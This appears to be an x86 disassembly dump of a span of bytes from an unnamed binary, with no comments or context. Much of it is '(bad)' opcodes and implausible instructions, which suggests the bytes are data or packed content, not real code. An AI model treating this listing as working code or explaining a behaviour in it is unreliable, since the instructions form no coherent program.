  4314da:	jmp    DWORD PTR [esi-0x18]
  4314dd:	inc    ebp
  4314de:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4314e4:	(bad)  
  4314e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4314e6:	inc    eax
  4314e8:	test   DWORD PTR [esi-0x2],esp
  4314eb:	inc    ebp
  4314ec:	dec    DWORD PTR [ebp-0x760bde75]
  4314f2:	(bad)  
  4314f3:	test   al,0xc3
  4314f5:	mov    DWORD PTR [ebp-0x769b56],ecx
  4314fb:	lods   al,BYTE PTR ds:[esi]
  4314fc:	push   eax
  4314fd:	inc    ebp
  4314fe:	jne    0x43150f
  431500:	dec    DWORD PTR [ebp+0x8]
  431503:	mov    ecx,DWORD PTR [ebx]
  431505:	sbb    al,0x0
  431507:	(bad)  
  431508:	mov    eax,0xc14fc3
  43150d:	mov    DWORD PTR [ecx-0xbabf64],ecx
  431513:	movsx  ecx,WORD PTR [ebp+0x4e]
  431517:	xor    eax,DWORD PTR [eax]
  431519:	add    eax,edi
  43151b:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  431521:	xor    edi,DWORD PTR [eax+0x854f66]
  431527:	dec    BYTE PTR [ecx-0x76bb01]
  43152d:	mov    BYTE PTR [ebx-0x76724001],al
  431533:	pushf  
  431534:	inc    esi
  431535:	(bad)  
  431536:	dec    DWORD PTR [ebp-0x7abe6373]
  43153c:	sar    esi,0x89
  43153f:	dec    DWORD PTR [eax+0x0]
  431542:	inc    DWORD PTR [eax]
  431544:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  43154b:	xlat   BYTE PTR ds:[ebx]
  43154c:	dec    edx
  43154d:	add    bh,bh
  43154f:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  431555:	lea    esp,[esi-0x50]
  431558:	(bad)  
  431559:	(bad)  
  43155a:	call   DWORD PTR [eax-0x1]
  43155d:	inc    ebp
  43155e:	rdpmc  
  431560:	add    BYTE PTR [ebx],al
  431562:	push   ax
  431564:	lea    eax,[ebp-0x1]
  43156a:	js     0x43156b
  43156c:	add    al,bh
  43156e:	push   bp
  431570:	lea    ecx,[ebp-0x7701]
  431576:	fmul   DWORD PTR [ebp-0x7a997800]
  43157c:	(bad)  
  43157d:	(bad)  
  43157e:	(bad)  
  43157f:	(bad)  
  431580:	jmp    DWORD PTR [ecx-0x7676ffb3]
  431586:	dec    eax
  431587:	mov    eax,0x8d8dffff
  43158c:	mov    al,0xb0
  43158e:	(bad)  
  43158f:	call   DWORD PTR [ecx+0x50]
  431592:	dec    ebp
  431593:	inc    ebp
  431594:	mov    esi,0x7030833
  431599:	push   eax
  43159a:	into   
  43159b:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  4315a1:	call   DWORD PTR [ecx-0x8]
  4315a4:	lea    edx,[ebp-0x1]
  4315a7:	jmp    0x7617ab
  4315ac:	inc    eax
  4315ad:	jnp    0x43153c
  4315af:	add    dh,bh
  4315b1:	inc    WORD PTR [ebp-0x8a00b0]
  4315b8:	mov    edx,eax
  4315ba:	inc    esp
  4315bb:	add    bh,bh
  4315bd:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  4315c3:	dec    DWORD PTR [ebx-0x7f820301]
  4315c9:	add    BYTE PTR [ecx],al
  4315cb:	data16 add BYTE PTR [ebp-0xb30077],al
  4315d2:	inc    eax
  4315d4:	(bad)  
  4315d5:	dec    si
  4315d7:	test   edi,edi
  4315d9:	(bad)  
  4315da:	cmp    edi,edi
  4315dc:	add    ecx,DWORD PTR [edi-0x39]
  4315df:	mov    edx,DWORD PTR [edx+0x66]
  4315e2:	inc    DWORD PTR [ebp-0x3d00cb]
  4315e8:	mov    eax,0x66ff8b5e
  4315ee:	jmp    0xb4ff:0xc7ff3895
  4315f5:	push   ecx
  4315f6:	inc    DWORD PTR [ebx-0x76ffccbb]
  4315fc:	call   DWORD PTR [esi-0x1]
  4315ff:	dec    DWORD PTR [eax]
  431601:	mov    ecx,0x805ff
  431606:	inc    ebp
  431607:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  43160d:	mov    ecx,0x35784
  431612:	add    BYTE PTR [ecx-0xffa59b],cl
  431618:	inc    ebp
  431619:	mov    ecx,0x9c6131
  43161e:	(bad)  
  43161f:	mov    eax,ebx
  431621:	pop    esp
  431622:	test   edi,edi
  431624:	clc    
  431625:	lea    eax,[ebp-0x24]
  431628:	cmp    eax,0xc7fe9c8d
  43162d:	push   eax
  43162f:	lea    eax,[ebp+0x45fff8fe]
  431635:	mov    esi,DWORD PTR [ecx]
  431637:	hlt    
  431638:	lahf   
  431639:	push   esp
  43163a:	mov    edx,DWORD PTR [ecx-0x4]
  43163d:	xor    eax,DWORD PTR [eax+0x7201bb]
  431643:	add    BYTE PTR [ebp-0x35],al
  431646:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  43164c:	mov    edx,DWORD PTR [ecx-0x74]
  43164f:	rol    BYTE PTR [eax],0x8d
  431652:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  431656:	nop
  431657:	push   ecx
  431658:	add    bh,bh
  43165a:	mov    esp,edi
  43165c:	in     al,0x85
  43165e:	jge    0x43165e
  431660:	test   edi,edi
  431662:	jne    0x4315e9
  431664:	(bad)  
  431665:	(bad)  
  431666:	sbb    bh,bh
  431668:	push   ebp
  431669:	inc    ebp
  43166a:	call   0xffdc10fa
  43166f:	add    BYTE PTR [ebp+0x66],al
  431672:	mov    edx,DWORD PTR [ebp-0xfc0075]
  431678:	cmp    al,0x85
  43167a:	ud0    eax,DWORD PTR [ebp-0x1]
  43167e:	test   DWORD PTR [edi+0x74],ecx
  431681:	dec    edi
  431682:	inc    DWORD PTR [ebp-0x50004]
  431688:	dec    DWORD PTR [edi-0x75]
  43168b:	dec    esi
  43168c:	cld    
  43168d:	test   DWORD PTR [eax+0xff01ff],eax
  431693:	icebp  
  431694:	add    BYTE PTR [edi-0x3a],cl
  431697:	test   ebx,eax
  431699:	inc    BYTE PTR [ebp-0x1]
  43169c:	jne    0x43169e
  43169e:	mov    eax,DWORD PTR [eax]
  4316a0:	cld    
  4316a1:	xor    BYTE PTR [ecx+0x500155],cl
  4316a7:	push   ebp
  4316a8:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4316ae:	add    BYTE PTR [ebp+0x35e90f50],al
  4316b4:	add    al,BYTE PTR [eax]
  4316b6:	add    BYTE PTR [ebx-0x38fe4f80],al
  4316bc:	add    ah,ch
  4316be:	or     BYTE PTR [ebp+0x4501f845],dh
  4316c4:	jmp    0xdf19ba
  4316c9:	(bad)  
  4316ca:	nop    ecx
  4316cd:	test   DWORD PTR [ebp+0x4502f8],eax
  4316d3:	xor    ecx,DWORD PTR [ebp-0x64]
  4316d6:	mov    eax,edi
  4316d8:	mov    ebx,DWORD PTR [eax+edx*2]
  4316db:	add    eax,0x45fef885
  4316e0:	dec    DWORD PTR [ebx+0x339445]
  4316e6:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4316ec:	dec    DWORD PTR [ebx-0x460f0375]
  4316f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4316f3:	add    esi,edi
  4316f5:	add    bh,bh
  4316f7:	rdpmc  
  4316f9:	add    BYTE PTR [ebx],0x1
  4316fc:	mov    DWORD PTR [eax],eax
  4316fe:	add    al,0x45
  431700:	dec    DWORD PTR [ecx-0x360b3373]
  431706:	dec    DWORD PTR [esi]
  431708:	push   eax
  431709:	jne    0x431750
  43170b:	mov    esi,DWORD PTR [ebx]
  43170d:	cld    
  43170e:	add    esp,ecx
  431710:	push   eax
  431711:	inc    DWORD PTR [ebp-0x75]
  431714:	add    eax,0x800e4
  431719:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43171f:	mov    DWORD PTR [ecx],eax
  431721:	sbb    al,0x0
  431723:	leave  
  431724:	test   DWORD PTR [edi-0x2],eax
  431727:	jne    0x431728
  431729:	call   0xff44012e
  43172e:	xor    BYTE PTR [ebp+0x4d],al
  431731:	mov    edi,edi
  431733:	enter  0x8,0x4d
  431737:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43173d:	mov    eax,DWORD PTR [eax]
  43173f:	cld    
  431740:	add    DWORD PTR [ecx],ebx
  431742:	inc    ebp
  431743:	dec    ebp
  431744:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43174a:	inc    eax
  43174b:	dec    DWORD PTR [ecx-0x270375]
  431751:	add    BYTE PTR [ebx-0x39d72701],cl
  431757:	xchg   ecx,eax
  431758:	ret    
  431759:	add    BYTE PTR [ebp-0x830075],al
  43175f:	add    BYTE PTR [ebp-0x75],al
  431762:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431768:	lea    edi,[edi-0xc]
  43176b:	add    bh,bh
  43176d:	mov    edx,DWORD PTR [eax-0x7b]
  431770:	inc    ebp
  431771:	rdpmc  
  431773:	jne    0x431778
  431775:	add    BYTE PTR [eax-0x75],dl
  431778:	inc    ebp
  431779:	clc    
  43177a:	add    eax,0x400009
  43177f:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431785:	mov    eax,DWORD PTR [ecx]
  431787:	in     al,dx
  431788:	add    dh,al
  43178a:	test   ebx,eax
  43178c:	inc    BYTE PTR [ebp-0xff0001]
  431792:	add    BYTE PTR [ebp-0x43],al
  431795:	cmp    esi,0xfffffff8
  431798:	(bad)  
  431799:	push   DWORD PTR [eax]
  43179b:	add    BYTE PTR [ebp-0x3a],dl
  43179e:	test   ebx,eax
  4317a0:	je     0x431727
  4317a2:	mov    edi,edi
  4317a4:	sbb    al,0xff
  4317a6:	test   DWORD PTR gs:[eax],eax
  4317a9:	(bad)  
  4317aa:	js     0x4317ab
  4317ac:	add    BYTE PTR [ebx-0x39b20bdd],cl
  4317b2:	sub    eax,ebx
  4317b4:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4317ba:	add    eax,DWORD PTR [eax]
  4317bc:	dec    ebp
  4317bd:	push   eax
  4317be:	mov    al,BYTE PTR [ebp+0x1]
  4317c1:	mov    eax,DWORD PTR [ebp-0x68]
  4317c4:	mov    eax,DWORD PTR [eax]
  4317c6:	sbb    bh,al
  4317c8:	or     ah,dh
  4317ca:	dec    ebp
  4317cb:	inc    DWORD PTR [eax+0x4]
  4317ce:	push   ecx
  4317cf:	add    BYTE PTR [edx-0x1],dh
  4317d2:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4317d8:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4317e2:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4317e8:	push   ecx
  4317e9:	cmp    BYTE PTR [ebx],al
  4317eb:	inc    ebp
  4317ec:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4317f2:	(bad)  
  4317f3:	(bad)  
  4317f4:	in     al,0xff
  4317f6:	add    BYTE PTR [ebp+0x0],al
  4317f9:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4317ff:	add    al,bh
  431801:	(bad)  
  431802:	jmp    0x8d85:0x74b0558d
  431809:	dec    DWORD PTR [eax]
  43180b:	call   DWORD PTR [ebp-0x7b]
  43180e:	mov    edi,esi
  431810:	lock call DWORD PTR [ebp-0x75]
  431814:	mov    esi,esp
  431816:	mov    ah,0xc6
  431818:	mov    bh,0xc3
  43181a:	mov    DWORD PTR [ebx-0x110003c4],ecx
  431820:	add    DWORD PTR [eax],0x450050ff
  431826:	mov    DWORD PTR [ebx+0x9598cc],ecx
  43182c:	inc    edi
  43182e:	push   esp
  431830:	jmp    0xcd00:0x650481ff
  431837:	mov    DWORD PTR [ebx],esi
  431839:	clc    
  43183a:	cmp    edi,0xff9cff3c
  431840:	jne    0x43184a
  431842:	mov    eax,eax
  431844:	add    esi,DWORD PTR [eax]
  431846:	int3   
  431847:	inc    ebp
  431848:	cmp    al,0x83
  43184a:	add    BYTE PTR [eax],bl
  43184c:	adc    DWORD PTR [ebx+0x768b5055],eax
  431852:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431858:	mov    edi,eax
  43185a:	cmp    BYTE PTR [ebp+0x45],cl
  43185d:	jmp    0x4317ea
  43185f:	mov    ebx,DWORD PTR [esp+ebp*8]
  431862:	inc    ebp
  431863:	or     al,0x2
  431865:	dec    DWORD PTR [ebp+0x18]
  431868:	jne    0x4318bf
  43186a:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  431870:	mov    edi,DWORD PTR [ebx]
  431872:	in     al,0x50
  431874:	xchg   ecx,eax
  431875:	jmp    0x343677a
  43187a:	adc    al,0x8b
  43187c:	inc    ebp
  43187d:	mov    al,ds:0x8b04008b
  431882:	push   ebp
  431883:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431889:	push   ebp
  43188a:	test   DWORD PTR [ebx-0x2800d701],ecx
  431890:	inc    ebp
  431891:	dec    ebp
  431892:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431898:	mov    DWORD PTR [eax],0xe9ff00f4
  43189e:	add    al,0x0
  4318a0:	add    BYTE PTR [eax],al
  4318a2:	mov    eax,edx
  4318a4:	push   eax
  4318a5:	rol    DWORD PTR [ebp-0xf0177],1
  4318ab:	bound  eax,QWORD PTR [ebp+0x50]
  4318ae:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4318b4:	add    BYTE PTR [ecx+0x558df0ff],cl
  4318ba:	mov    al,0xf
  4318bc:	test   DWORD PTR [edx],edx
  4318be:	call   DWORD PTR [ebp-0x7a0001]
  4318c4:	(bad)  
  4318c5:	loop   0x4318c6
  4318c7:	jnp    0xc6990ccd
  4318cd:	mov    eax,ebx
  4318cf:	cmp    al,0x8b
  4318d1:	(bad)  
  4318d2:	cld    
  4318d3:	shr    esi,0xc
  4318d6:	add    dl,al
  4318d8:	push   eax
  4318d9:	lea    eax,[ebp-0x1]
  4318dc:	mov    edx,esi
  4318de:	cwde   
  4318df:	cli    
  4318e0:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4318e6:	or     BYTE PTR [eax],cl
  4318e8:	inc    ebp
  4318e9:	dec    ebp
  4318ea:	inc    DWORD PTR [ebx+0x74803914]
  4318f0:	add    DWORD PTR [ebx+0x451800],ecx
  4318f6:	call   DWORD PTR [eax+edx*1]
  4318f9:	add    ecx,DWORD PTR [ebp-0x34]
  4318fc:	push   edi
  4318fd:	adc    al,0x8
  4318ff:	mov    edx,DWORD PTR [ebp-0x14]
  431902:	mov    ecx,DWORD PTR [ebp+0x18]
  431905:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431909:	inc    DWORD PTR [eax+esi*8]
  43190c:	inc    ebp
  43190d:	stos   BYTE PTR es:[edi],al
  43190e:	mov    edx,DWORD PTR [ebp-0x4]
  431911:	add    DWORD PTR [ebp-0x1c],eax
  431914:	mov    edx,DWORD PTR [ebp-0x70]
  431917:	cmp    eax,DWORD PTR [eax]
  431919:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43191a:	mov    eax,DWORD PTR [eax]
  43191c:	cld    
  43191d:	jae    0x43189f
  43191f:	add    eax,DWORD PTR [ecx]
  431921:	clc    
  431922:	add    BYTE PTR [eax+0x30],dl
  431925:	mov    DWORD PTR [ecx],esi
  431927:	clc    
  431928:	pop    ds
  431929:	inc    ebp
  43192a:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  431930:	(bad)  
  431931:	push   DWORD PTR [edi]
  431933:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431939:	(bad)  
  43193a:	jae    0x43193b
  43193c:	mov    eax,DWORD PTR [ebp-0x740175]
  431942:	sub    eax,DWORD PTR [eax]
  431944:	add    eax,DWORD PTR [eax]
  431946:	mov    DWORD PTR [ecx+0x5f],eax
  431949:	mov    DWORD PTR [ebx-0x4],ebx
  43194c:	ret    0xff
  43194f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431955:	ret    
  431956:	mov    eax,DWORD PTR [ebp-0x6f0075]
  43195c:	add    BYTE PTR [ebp-0x7d],al
  43195f:	mov    DWORD PTR [eax],eax
  431961:	add    al,0x84
  431963:	inc    DWORD PTR [ecx]
  431965:	lea    eax,[eax]
  431967:	hlt    
  431968:	sar    bh,cl
  43196a:	test   BYTE PTR [eax+0x1],dl
  43196d:	inc    ebp
  43196e:	add    BYTE PTR [ebx],dh
  431970:	test   BYTE PTR [ebx],0x84
  431973:	push   eax
  431974:	add    BYTE PTR [ebp+0x0],al
  431977:	add    eax,0x86
  43197c:	add    BYTE PTR [ebx-0x7f7b0340],cl
  431982:	add    BYTE PTR [ecx],al
  431984:	add    BYTE PTR [eax],al
  431986:	mov    esi,0x550030
  43198b:	mov    ecx,DWORD PTR [edi]
  43198d:	cld    
  43198e:	fidiv  DWORD PTR [ebp+0x0]
  431991:	mov    edi,DWORD PTR [ecx]
  431993:	xor    BYTE PTR [eax+eax*1],0x84
  431997:	add    eax,DWORD PTR [eax]
  431999:	sbb    BYTE PTR [eax],al
  43199b:	jne    0x43194e
  43199d:	mov    eax,DWORD PTR [ecx]
  43199f:	sbb    BYTE PTR [eax],al
  4319a1:	mov    DWORD PTR [ebp-0x1],esp
  4319a4:	add    BYTE PTR [eax+0x30e45ca],bh
  4319aa:	ret    0xb7fc
  4319ad:	dec    ebp
  4319ae:	or     al,0x89
  4319b0:	dec    ebp
  4319b1:	cld    
  4319b2:	cmovne ecx,DWORD PTR [eax-0x75]
  4319b6:	add    edi,esp
  4319b8:	seto   BYTE PTR [esi-0x72ffffff]
  4319bf:	inc    ebp
  4319c0:	adc    al,0x8b
  4319c2:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4319c9:	cmp    DWORD PTR [edi+0x72],edx
  4319cc:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4319d2:	gs cmp al,0x0
  4319d5:	je     0x4319ad
  4319d7:	push   eax
  4319d8:	sar    BYTE PTR [eax],1
  4319da:	mov    bh,0x3e
  4319dc:	push   cs
  4319dd:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4319e3:	add    DWORD PTR [ecx+0x12],ebp
  4319e6:	dec    edx
  4319e7:	(bad)  
  4319e8:	mov    eax,edx
  4319ea:	in     al,dx
  4319eb:	adc    DWORD PTR [ecx],esi
  4319ed:	pop    esi
  4319ee:	inc    ecx
  4319ef:	leave  
  4319f0:	or     DWORD PTR [eax],ebx
  4319f2:	gs push ebp
  4319f4:	add    ah,ch
  4319f6:	into   
  4319f7:	in     al,dx
  4319f8:	enter  0xb756,0xf0
  4319fc:	push   cs
  4319fd:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431a07:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  431a0d:	jnp    0x74439f15
  431a13:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431a19:	add    BYTE PTR [edi],cl
  431a1b:	mov    edi,DWORD PTR [ecx-0x78]
  431a1e:	ltr    WORD PTR [ecx-0x7b]
  431a22:	dec    DWORD PTR [edi]
  431a24:	clc    
  431a25:	out    0x45,eax
  431a27:	add    BYTE PTR [eax],cl
  431a29:	cmp    ebx,0xffffff8c
  431a2c:	jge    0x431a2e
  431a2e:	jb     0x431a40
  431a30:	je     0x521ab0
  431a36:	pop    edx
  431a37:	push   esi
  431a38:	mov    ecx,DWORD PTR [edi]
  431a3a:	in     al,dx
  431a3b:	rol    DWORD PTR [ebp+0x0],1
  431a3e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431a45:	cmp    DWORD PTR [ecx],0xfffffff0
  431a48:	hlt    
  431a49:	mov    esp,DWORD PTR [eax+0xf034d2b]
  431a4f:	(bad)  
  431a51:	push   eax
  431a52:	jns    0xb842fed0
  431a58:	lock push cs
  431a5a:	ror    edx,0x3
  431a5d:	test   BYTE PTR [ecx+0x5500e800],cl
  431a63:	dec    eax
  431a64:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431a68:	(bad)  
  431a69:	mov    esi,0x7f33ff5f
  431a6e:	inc    eax
  431a6f:	test   DWORD PTR [edx],eax
  431a71:	je     0x431a33
  431a73:	mov    ecx,ecx
  431a75:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431a79:	and    eax,DWORD PTR [eax+0xf0103]
  431a7f:	jp     0x431a6d
  431a81:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431a85:	add    edx,DWORD PTR [edi+0x74]
  431a88:	sbb    BYTE PTR [ebp+0x4d001484],cl
  431a8e:	add    BYTE PTR [ebp-0x74c48bbb],al
  431a94:	je     0x431a19
  431a96:	cmp    eax,edi
  431a98:	js     0x431abd
  431a9a:	add    eax,0xeb0fc003
  431a9f:	jns    0x431a2c
  431aa1:	vmread DWORD PTR [ecx+0x45],ebx
  431aa5:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431aab:	adc    al,0x8b
  431aad:	jge    0x431ac3
  431aaf:	mov    edi,DWORD PTR [eax-0x4]
  431ab2:	add    edi,DWORD PTR [edi]
  431ab4:	or     bh,bh
  431ab6:	push   ebp
  431ab7:	push   es
  431ab8:	mov    DWORD PTR [ebp-0x4],ebx
  431abb:	add    edi,esi
  431abd:	pop    es
  431abe:	add    esi,DWORD PTR [edi-0x48ccf183]
  431ac4:	mov    DWORD PTR [esp+esi*8],ecx
  431ac7:	inc    ebp
  431ac8:	pop    ebp
  431ac9:	xor    DWORD PTR [esi-0x4],0x3b
  431acd:	add    edx,DWORD PTR [ecx+edi*1]
  431ad0:	push   es
  431ad1:	clc    
  431ad2:	mov    bh,0xdb
  431ad4:	jp     0x431a8d
  431ad6:	add    cl,BYTE PTR [esi]
  431ad8:	div    DWORD PTR [edi+0x4d8b0c1c]
  431ade:	test   edi,edi
  431ae0:	je     0x431ad6
  431ae2:	mov    eax,ecx
  431ae4:	or     BYTE PTR [ebx],al
  431ae6:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431aec:	jbe    0x431b60
  431aee:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431af4:	add    ecx,DWORD PTR [esi]
  431af6:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431afc:	add    eax,DWORD PTR [ebx-0x287af783]
  431b02:	je     0x431b51
  431b04:	mov    DWORD PTR [ecx],edi
  431b06:	mov    esi,eax
  431b08:	hlt    
  431b09:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431b10:	jb     0x431ad2
  431b12:	jmp    0x431aff
  431b14:	xor    esi,DWORD PTR [ebx]
  431b16:	pop    edi
  431b17:	pop    esi
  431b18:	pop    ebx
  431b19:	ret    
  431b1a:	ret    0x8b
  431b1d:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431b23:	xor    DWORD PTR [ecx],0xc
  431b26:	pushf  
  431b27:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431b2d:	rdmsr  
  431b2f:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431b36:	dec    ebp
  431b37:	ret    
  431b38:	mov    edi,DWORD PTR [esi-0x4]
  431b3b:	pop    eax
  431b3c:	dec    ebp
  431b3d:	jne    0x431aca
  431b3f:	xor    edi,esp
  431b41:	inc    eax
  431b42:	dec    ebp
  431b43:	jbe    0x431b98
  431b45:	inc    eax
  431b46:	pop    ebp
  431b47:	add    edx,DWORD PTR [esi+0x8]
  431b4a:	push   esp
  431b4b:	dec    eax
  431b4c:	push   ecx
  431b4d:	mov    eax,edi
  431b4f:	and    al,0xf0
  431b51:	jo     0x431b3e
  431b53:	mov    eax,DWORD PTR [ebx]
  431b55:	sbb    BYTE PTR [ebp+0x4d],cl
  431b58:	mov    eax,DWORD PTR [ebx]
  431b5a:	nop
  431b5b:	or     BYTE PTR [eax],al
  431b5d:	jne    0x431bb6
  431b5f:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431b65:	cld    
  431b66:	xor    edi,edi
  431b68:	add    edi,DWORD PTR [ebp+0x3]
  431b6b:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431b71:	js     0x431af7
  431b73:	jae    0x431b77
  431b75:	(bad)  
  431b77:	xor    al,0x5d
  431b79:	jmp    0x431b06
  431b7b:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431b82:	fdecstp 
  431b84:	test   BYTE PTR [edi],ah
  431b86:	add    bh,BYTE PTR [ebp+0x0]
  431b89:	add    ebx,DWORD PTR [ebp-0x77]
  431b8c:	mov    edi,eax
  431b8e:	cmp    al,0x0
  431b91:	adc    dh,BYTE PTR [ebx]
  431b93:	jge    0x431b98
  431b95:	mov    edi,DWORD PTR [ebx]
  431b97:	jl     0x431ba8
  431b99:	clc    
  431b9a:	dec    edi
  431b9b:	jge    0x431b9d
  431b9d:	mov    eax,DWORD PTR [ebx]
  431b9f:	jb     0x431ba9
  431ba1:	mov    ecx,DWORD PTR [ebp-0x8]
  431ba4:	mov    edi,edi
  431ba6:	xor    edx,DWORD PTR [eax]
  431ba8:	add    edi,DWORD PTR [ebx]
  431baa:	mov    DWORD PTR [ebp-0x10],edi
  431bad:	inc    edi
  431bae:	pop    ebp
  431baf:	jge    0x431bec
  431bb1:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431bb5:	mov    edx,0xc05d87f0
  431bba:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431bbe:	fimul  WORD PTR [eax]
  431bc0:	fist   WORD PTR [ebp+0x1c]
  431bc3:	in     al,dx
  431bc4:	jne    0x431bb2
  431bc6:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431bcc:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431bd0:	fdivp  st(0),st
  431bd2:	fild   WORD PTR [ebp+0x4510f85c]
  431bd8:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431bde:	inc    ebp
  431bdf:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431be5:	mov    ebp,DWORD PTR [ebx-0x4]
  431be8:	adc    al,0x8b
  431bea:	rcl    DWORD PTR [eax],0x48
  431bed:	mov    esi,0x7080803
  431bf2:	fiadd  WORD PTR [ebp+0x4d]
  431bf5:	(bad)  
  431bf6:	mov    edx,DWORD PTR [edx-0x4]
  431bf9:	mov    edx,DWORD PTR [ebp-0x4]
  431bfc:	xor    ebx,DWORD PTR [ebx+0x330103]
  431c02:	mov    DWORD PTR [edi+0x872dc],edi
  431c08:	xlat   BYTE PTR ds:[ebx]
  431c09:	into   
  431c0a:	ffreep st(6)
  431c0c:	retf   0x6c7
  431c0f:	iret   
  431c10:	dec    ebp
  431c11:	inc    ebp
  431c12:	mov    DWORD PTR [ebx],edi
  431c14:	fmul   QWORD PTR [edi]
  431c16:	dec    ebp
  431c17:	jnp    0x431c4c
  431c19:	add    BYTE PTR [ebx],al
  431c1b:	mov    ecx,DWORD PTR [esp+edi*8]
  431c1e:	inc    ebp
  431c1f:	dec    ebp
  431c20:	lea    esi,[ebx]
  431c22:	add    DWORD PTR [ebx],eax
  431c24:	jb     0x431c61
  431c26:	add    BYTE PTR [edi],cl
  431c28:	inc    ebp
  431c29:	imul   eax,edi,0x858bd800
  431c2f:	cld    
  431c30:	clc    
  431c31:	mov    DWORD PTR [ebp+0x0],eax
  431c34:	inc    DWORD PTR [eax]
  431c36:	or     al,0xde
  431c38:	sbb    bh,0x1
  431c3b:	retf   
  431c3c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431c43:	dec    ebp
  431c44:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431c4a:	enter  0x12de,0xdf
  431c4e:	inc    ebp
  431c4f:	pop    ebp
  431c50:	dec    DWORD PTR [ebx-0x257f0ff4]
  431c56:	add    DWORD PTR [edx],edx
  431c58:	add    BYTE PTR [ebp+0x50],dl
  431c5b:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431c61:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431c67:	or     ah,al
  431c69:	pop    ss
  431c6a:	cdq    
  431c6b:	push   ebp
  431c6c:	clc    
  431c6d:	mov    eax,DWORD PTR [ebp-0x4]
  431c70:	xor    edx,edx
  431c72:	add    esi,DWORD PTR [ebx]
  431c74:	cmp    eax,DWORD PTR [ebx]
  431c76:	hlt    
  431c77:	cmp    DWORD PTR [ebx],esp
  431c79:	or     al,BYTE PTR [ebp+0xf]
  431c7c:	mov    eax,DWORD PTR [edx]
  431c7e:	loopne 0x431c80
  431c80:	(bad)  
  431c81:	mov    ecx,esi
  431c83:	cld    
  431c84:	pushf  
  431c85:	pop    ebp
  431c86:	fwait
  431c87:	mov    esi,DWORD PTR [edx]
  431c89:	lock mov eax,eax
  431c8c:	adc    BYTE PTR [ebx],al
  431c8e:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431c95:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431c9b:	dec    ebp
  431c9c:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431ca2:	(bad)  
  431ca3:	iret   
  431ca4:	inc    ebp
  431ca5:	(bad)  
  431ca6:	jne    0x431cf5
  431ca8:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431cae:	(bad)  
  431caf:	cmp    ebx,eax
  431cb1:	je     0x431c39
  431cb3:	add    edi,edi
  431cb5:	or     bh,bh
  431cb7:	dec    ebp
  431cb8:	inc    ebp
  431cb9:	mov    esi,DWORD PTR [ebx]
  431cbb:	cld    
  431cbc:	add    ecx,esi
  431cbe:	cmp    ecx,DWORD PTR [eax-0xc]
  431cc1:	mov    edx,DWORD PTR [edi]
  431cc3:	or     BYTE PTR [ebp-0x7c],al
  431cc6:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431ccc:	test   BYTE PTR [ebx+ebx*4],cl
  431ccf:	inc    ebp
  431cd0:	xor    bh,BYTE PTR [esi]
